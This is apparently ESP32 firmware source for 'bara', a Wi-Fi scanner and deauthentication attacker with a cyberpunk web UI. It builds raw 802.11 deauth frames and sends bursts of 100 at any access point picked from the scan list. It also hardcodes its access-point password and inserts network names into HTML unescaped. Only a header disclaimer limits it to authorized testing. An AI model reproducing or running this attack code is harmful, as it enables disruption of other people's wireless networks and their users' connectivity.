/*
 * ==============================================================
 *                      TOOL: bara
 *          Developer: Ahmed Nour Ahmed from Qena, Egypt 🇪🇬
 *          Description: ESP32 WiFi Scanner + Deauth Attacker
 *          Language: English
 *          Interface: Cyberpunk Hacker-Themed Web UI
 *          Target: ESP32 (Wi-Fi 2.4GHz only)
 *          License: For educational/research purposes ONLY.
 * ==============================================================
 * ⚠️ LEGAL WARNING:
 * This tool is designed for authorized penetration testing ONLY.
 * Unauthorized use is illegal. You assume all legal responsibility.
 * ==============================================================
 */

#include <WiFi.h>
#include <WebServer.h>
#include <ESPmDNS.h>
#include <esp_wifi.h>
#include <esp_ota_ops.h>
#include <rom/ets_sys.h>

// =============== CONFIGURATION ===============
const char* softAP_SSID = "bara";
const char* softAP_PASSWORD = "A7med@Elshab7";
const uint16_t webPort = 80;

// =============== GLOBALS ===============
WebServer server(webPort);
String scanResultHTML = "";
bool scanning = false;
uint8_t channelMap[14] = {0}; // Tracks best channel per BSSID

// =============== DEAUTH ATTACK ===============
extern "C" {
  #include "esp_wifi.h"
}

void sendDeauth(const uint8_t* ap_mac, const uint8_t* client_mac, uint8_t channel, int count = 100, int interval_us = 100000) {
  wifi_country_t country = { .cc = "US", .schan = 1, .nchan = 11, .policy = WIFI_COUNTRY_POLICY_MANUAL };
  esp_wifi_set_country(&country);
  esp_wifi_set_promiscuous(true);

  uint8_t deauthPacket[26] = {
    0xC0, 0x00, // Type/Subtype: Deauth
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x01, 0x00, // Reason: Unspecified
    0x00, 0x00, 0x00, 0x00 // FCS (ignored)
  };

  // Set BSSID and Source
  memcpy(&deauthPacket[10], ap_mac, 6);
  memcpy(&deauthPacket[16], ap_mac, 6);

  // Set channel
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  for (int i = 0; i < count; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delayMicroseconds(interval_us);
  }

  esp_wifi_set_promiscuous(false);
}

// =============== HTML TEMPLATES ===============
String getHTMLHeader() {
  return R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>bara - Cyber Wi-Fi Cracker</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Courier New', monospace; }
    body {
      background: #000;
      color: #0f0;
      overflow-x: hidden;
      background-image: 
        radial-gradient(rgba(0,40,0,0.2) 2px, transparent 2px),
        repeating-linear-gradient(0deg, rgba(0,255,0,0.03), rgba(0,255,0,0.03) 1px, transparent 1px, transparent 25px),
        repeating-linear-gradient(90deg, rgba(0,255,0,0.03), rgba(0,255,0,0.03) 1px, transparent 1px, transparent 25px);
      background-size: 100% 100%, 25px 25px, 25px 25px;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: 
        linear-gradient(rgba(0,0,0,0.95) 0%, transparent 100%),
        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" opacity="0.02"><text x="0" y="15" font-size="12" fill="green">01010101</text></svg>');
      z-index: -1;
    }
    header {
      text-align: center;
      padding: 20px 0;
      border-bottom: 2px solid #0f0;
      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
      background: rgba(0,20,0,0.6);
    }
    h1 { font-size: 2.5rem; letter-spacing: 3px; }
    .dev { font-size: 0.9rem; color: #0a0; margin-top: 5px; }
    .container { max-width: 1200px; margin: 20px auto; padding: 0 15px; }
    .btn {
      background: transparent;
      color: #0f0;
      border: 1px solid #0f0;
      padding: 10px 20px;
      margin: 10px 5px;
      cursor: pointer;
      text-transform: uppercase;
      letter-spacing: 2px;
      transition: all 0.3s;
    }
    .btn:hover {
      background: rgba(0,255,0,0.1);
      box-shadow: 0 0 15px #0f0;
    }
    .network {
      background: rgba(0,30,0,0.7);
      border: 1px solid #0a0;
      margin: 15px 0;
      padding: 15px;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,255,0,0.2);
    }
    .ssid { font-size: 1.3rem; color: #0f8; }
    .info { margin: 8px 0; color: #0c0; }
    .deauth-btn {
      background: transparent;
      border: 1px solid red;
      color: red;
      padding: 8px 15px;
      margin-top: 10px;
    }
    .deauth-btn:hover {
      background: rgba(255,0,0,0.2);
      box-shadow: 0 0 15px red;
    }
    .status {
      text-align: center;
      margin: 20px 0;
      color: #ff0;
      font-weight: bold;
      min-height: 25px;
    }
    .matrix-bg {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: -2;
      opacity: 0.07;
      pointer-events: none;
    }
    @keyframes flicker { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
    .flicker { animation: flicker 2s infinite; }
  </style>
</head>
<body>
  <div class="matrix-bg" id="matrix"></div>
  <header>
    <h1 class="flicker">[ B A R A ]</h1>
    <div class="dev">Developer: Ahmed Nour Ahmed • Qena, Egypt 🇪🇬</div>
  </header>
  <div class="container">
    <div style="text-align:center;">
      <button class="btn" onclick="scan()">SCAN NETWORKS</button>
      <button class="btn" onclick="window.location.reload()">REFRESH</button>
    </div>
    <div class="status" id="status"></div>
)rawliteral";
}

String getHTMLFooter() {
  return R"rawliteral(
  </div>
  <script>
    function scan() {
      document.getElementById('status').innerText = 'Scanning...';
      fetch('/scan')
        .then(r => r.text())
        .then(html => {
          document.querySelector('.container').innerHTML = 
            '<div style="text-align:center;"><button class="btn" onclick="scan()">SCAN</button></div>' +
            '<div class="status" id="status"></div>' + html;
        })
        .catch(e => {
          document.getElementById('status').innerText = 'ERROR: ' + e;
        });
    }

    function deauth(ssid, bssid, ch) {
      if (!confirm('Launch DEAUTH attack on\\nSSID: ' + ssid + '\\nBSSID: ' + bssid + '?')) return;
      document.getElementById('status').innerText = 'Attacking ' + ssid + '...';
      fetch('/deauth?bssid=' + encodeURIComponent(bssid) + '&ch=' + ch)
        .then(r => r.text())
        .then(msg => {
          alert(msg);
          document.getElementById('status').innerText = 'Attack completed.';
        });
    }
  </script>
</body>
</html>
)rawliteral";
}

// =============== WEB HANDLERS ===============
void handleRoot() {
  String html = getHTMLHeader();
  if (scanResultHTML.length() > 0) {
    html += scanResultHTML;
  } else {
    html += "<p style='text-align:center;color:#ff0;'>No networks scanned yet. Click SCAN.</p>";
  }
  html += getHTMLFooter();
  server.send(200, "text/html", html);
}

void handleScan() {
  scanning = true;
  int n = WiFi.scanNetworks(true, false, false, 200); // async, only 2.4GHz, no duplicates
  delay(5000); // wait for async scan

  String networks = "";
  for (int i = 0; i < n; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    char bssidStr[18];
    snprintf(bssidStr, sizeof(bssidStr), "%02x:%02x:%02x:%02x:%02x:%02x",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

    int rssi = WiFi.RSSI(i);
    String strength = (rssi <= -80) ? "Weak" : (rssi <= -60) ? "Medium" : "Strong";
    String bar = "<span style='color:#0f0;'>" + String(strength) + "</span>";

    // Track channel per BSSID for deauth
    channelMap[i % 14] = WiFi.channel(i);

    networks += "<div class='network'>";
    networks += "<div class='ssid'>" + WiFi.SSID(i) + "</div>";
    networks += "<div class='info'>BSSID: " + String(bssidStr) + "</div>";
    networks += "<div class='info'>Channel: " + String(WiFi.channel(i)) + " | RSSI: " + String(rssi) + " dBm (" + bar + ")</div>";
    networks += "<div class='info'>Encryption: " + ((WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "OPEN" : "SECURED") + "</div>";
    networks += "<button class='deauth-btn' onclick=\"deauth('" + 
                WiFi.SSID(i) + "','" + String(bssidStr) + "'," + String(WiFi.channel(i)) + ")\">DEAUTH ATTACK</button>";
    networks += "</div>";
  }

  scanResultHTML = networks;
  scanning = false;
  server.send(200, "text/html", networks);
}

void handleDeauth() {
  String bssidStr = server.arg("bssid");
  int channel = server.arg("ch").toInt();

  if (bssidStr.length() != 17 || channel < 1 || channel > 14) {
    server.send(400, "text/plain", "Invalid BSSID or channel.");
    return;
  }

  uint8_t bssid[6];
  int idx = 0;
  for (int i = 0; i < 6; i++) {
    bssid[i] = (uint8_t)strtol(bssidStr.substring(idx, idx + 2).c_str(), NULL, 16);
    idx += 3;
  }

  // Launch deauth (100 packets)
  sendDeauth(bssid, NULL, channel, 100, 100000);

  server.send(200, "text/plain", "Deauth attack launched on " + bssidStr + " (Channel " + String(channel) + ")");
}

void handleNotFound() {
  server.send(404, "text/plain", "BARA TOOL - 404 Not Found");
}

// =============== SETUP ===============
void setup() {
  Serial.begin(115200);
  delay(100);

  // Start SoftAP
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(softAP_SSID, softAP_PASSWORD);

  // Web Server
  server.on("/", HTTP_GET, handleRoot);
  server.on("/scan", HTTP_GET, handleScan);
  server.on("/deauth", HTTP_GET, handleDeauth);
  server.onNotFound(handleNotFound);
  server.begin();

  // Optional: mDNS
  if (MDNS.begin("bara")) {
    MDNS.addService("http", "tcp", 80);
  }

  Serial.println("\n\n=== BARA TOOL READY ===");
  Serial.print("AP SSID: "); Serial.println(softAP_SSID);
  Serial.print("Password: "); Serial.println(softAP_PASSWORD);
  Serial.print("Web UI: http://192.168.4.1\n");
  Serial.println("Developer: Ahmed Nour Ahmed from Qena");
}

// =============== LOOP ===============
void loop() {
  server.handleClient();
  delay(1);
}
